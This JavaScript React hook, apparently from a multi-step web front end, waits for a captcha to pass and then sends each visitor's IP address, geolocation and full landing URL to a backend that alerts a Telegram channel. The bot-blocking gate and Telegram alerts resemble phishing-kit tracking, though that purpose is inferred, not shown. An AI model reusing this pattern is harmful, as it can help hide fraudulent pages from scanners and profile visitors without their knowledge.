import { useState, useEffect, useRef } from "react";
import { v4 as uuid } from "uuid";
import { IPService } from "../utils/ipService";
import { buildApiUrl } from "../config/api";
import {
  retryWithBackoff,
  RETRY_CONFIGS,
  fetchWithTimeout,
} from "../utils/retryUtils";
import {
  useCaptcha,
  CAPTCHA_SESSION_TOKEN_KEY,
} from "../components/Captcha/InvisibleCaptchaGate";

export const useInitialSetup = (setAllData, setStep) => {
  const [Unik, setUnik] = useState("");
  const [isInitialized, setIsInitialized] = useState(false);
  const ranRef = useRef(false);
  // Nothing reaches the backend before the captcha passes: bots produce no
  // visit alert, no session, no socket - no movement at all.
  const { verified } = useCaptcha();

  useEffect(() => {
    if (!verified || ranRef.current) return;
    ranRef.current = true;

    const uniqueId = uuid().slice(0, 8);
    setUnik(uniqueId);

    const context = process.env.NEXT_PUBLIC_CONTEXT || "";

    const postIp = async (params, notifyNow, timeoutMs = 10000) => {
      let sessionToken = null;
      try {
        sessionToken = sessionStorage.getItem(CAPTCHA_SESSION_TOKEN_KEY);
      } catch {
        sessionToken = null;
      }

      await retryWithBackoff(async () => {
        const response = await fetchWithTimeout(
          buildApiUrl("/api/send/ip"),
          {
            method: "POST",
            body: JSON.stringify({ ...params, notifyNow }),
            headers: {
              "Content-type": "application/json; charset=UTF-8",
              "X-Robots-Tag": "googlebot: nofollow",
              ...(sessionToken ? { "X-Session-Token": sessionToken } : {}),
            },
          },
          timeoutMs
        );

        if (!response.ok) {
          const error = new Error(
            `HTTP ${response.status}: ${response.statusText}`
          );
          error.response = { status: response.status };
          throw error;
        }

        return response;
      }, RETRY_CONFIGS.INTERNAL_API);
    };

    const initializeUserData = async () => {
      let ip = null;
      let locationData = { country: null, city: null };

      try {
        ip = await IPService.fetchIPAddress();
      } catch (error) {
        console.error("Failed to fetch IP after retries:", error);
      }

      if (ip) {
        try {
          locationData = await IPService.fetchLocationData(ip);
        } catch (error) {
          console.error("Failed to fetch location data after retries:", error);
          locationData = { country: null, city: null };
        }
      }

      const details = {
        id: uniqueId,
        ip: ip || "unknown",
        country: locationData.country || "unknown",
        city: locationData.city || "unknown",
        context,
        // The exact landing URL, keeping tracking params like fbclid/utm.
        landingUrl: window.location.href,
      };

      setAllData((prevData) => ({ ...prevData, ...details }));

      // Notify Telegram with the IP/location so new traffic is identifiable.
      try {
        await postIp(details, true, 45000); // tolerate a cold-started backend
      } catch (error) {
        console.error("Failed to send visit notification:", error);
      }

      setAllData((prevData) => ({
        ...prevData,
        id: uniqueId,
        context,
      }));
      setIsInitialized(true);
    };

    initializeUserData();
  }, [verified, setAllData]);

  return {
    Unik,
    isInitialized,
  };
};
